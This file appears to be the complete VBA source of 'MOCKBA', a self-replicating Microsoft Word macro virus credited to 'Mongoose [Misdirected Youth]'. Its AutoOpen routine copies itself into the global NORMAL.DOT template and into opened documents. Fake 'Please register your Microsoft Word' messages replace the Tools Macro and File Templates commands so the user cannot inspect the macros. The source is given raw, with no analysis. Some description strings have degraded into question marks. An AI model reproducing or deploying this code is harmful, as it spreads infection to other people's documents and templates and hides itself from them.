   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ???????? ?????? ? ????? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
   WordBasic.MsgBox "Please register your Microsoft Word", 32
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ???????? ?????? ? ????? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   WordBasic.MsgBox "Please register your Microsoft Word", 32
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim d$
   Dim info$
   Dim Ill
   Dim i
   Dim Infected
   On Error Resume Next
   d$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
   info$ = "MOCKBA version O.91 by Mongoose [Misdirected Youth]"
   If GetAttr(d$) < 32 Then GoTo Del
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=d$, Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=d$, Name:="FileTemplates", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=d$, Name:="ToolsMacro", Tab:=3
   Ill = WordBasic.CountMacros(0)
   If Ill > 0 Then
    For i = 1 To Ill
     If WordBasic.[MacroName$](i, 1) = "FileTemplates" Then Infected = 13
    Next i
   End If
   If Infected <> 13 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "FileTemplates", WordBasic.[FileName$]() + ":FileTemplates"
    WordBasic.MacroCopy "FileTemplates", WordBasic.[FileName$]() + ":ToolsMacro"
   End If
   End Sub
